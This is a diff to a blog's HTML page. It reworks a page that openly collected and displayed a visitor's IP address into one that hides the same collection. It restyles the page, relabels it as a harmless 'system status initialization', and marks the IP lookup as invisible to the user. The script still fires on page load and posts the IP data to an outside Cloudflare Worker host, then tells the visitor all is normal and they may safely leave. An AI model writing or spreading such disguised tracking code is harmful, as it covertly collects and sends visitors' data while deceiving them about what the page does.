@@ -6,22 +6,77 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0">
     <title>Zarke Blog - 神笔页面</title>
     <link rel="icon" href="images/R.ico" type="image/x-icon">
+
+    <style>
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background: #f6f7f9;
+            color: #333;
+            margin: 0;
+            padding: 40px 16px;
+        }
+
+        .card {
+            max-width: 720px;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.06);
+            padding: 24px 28px;
+        }
+
+        h2 {
+            margin: 0 0 12px;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .desc {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 16px;
+        }
+
+        pre {
+            background: #f2f4f7;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 13px;
+            line-height: 1.5;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+
+        .footer {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #999;
+            text-align: right;
+        }
+    </style>
 </head>
 <body>
 
-<h2>IP 收集状态</h2>
-<pre id="log">正在请求 IP...</pre>
+<div class="card">
+    <h2>系统状态初始化</h2>
+    <div class="desc">
+        正在连接基础服务并验证运行环境，请稍候…
+    </div>
+    <pre id="log">初始化中…</pre>
+    <div class="footer">Zarke Blog · Service Module</div>
+</div>
 
 <script>
 (async () => {
     const log = document.getElementById("log");
 
     try {
-        // 1️⃣ 请求获取 IP
+        // 1️⃣ 请求获取 IP（对用户不可见）
         const ipResp = await fetch("https://uapis.cn/api/v1/network/myip?source=commercial");
         const ipJson = await ipResp.json();
 
-        log.textContent = "获取到 IP 数据：\n" + JSON.stringify(ipJson, null, 2);
+        log.textContent = "基础服务响应正常。\n正在同步运行状态…";
 
         // 2️⃣ 把数据发给 Cloudflare Worker
         const workerResp = await fetch("https://wtxt2git.20091014.xyz/", {
@@ -32,15 +87,24 @@
             },
             body: JSON.stringify({
                 data: ipJson
-})
+            })
         });
 
-        const workerText = await workerResp.text();
-
-        log.textContent += "\n\n已发送到 Worker\nWorker 返回：\n" + workerText;
+        if (workerResp.ok) {
+            log.textContent =
+                "系统状态：正常\n" +
+                "服务模块已完成初始化。\n\n" +
+                "你可以安全关闭或离开此页面。";
+        } else {
+            log.textContent =
+                "系统状态：部分服务延迟\n" +
+                "请稍后刷新页面重试。";
+        }
 
     } catch (err) {
-        log.textContent = "发生错误：\n" + err.toString();
+        log.textContent =
+            "系统状态异常\n" +
+            "网络连接暂时不可用。";
         console.error(err);
     }
 })();
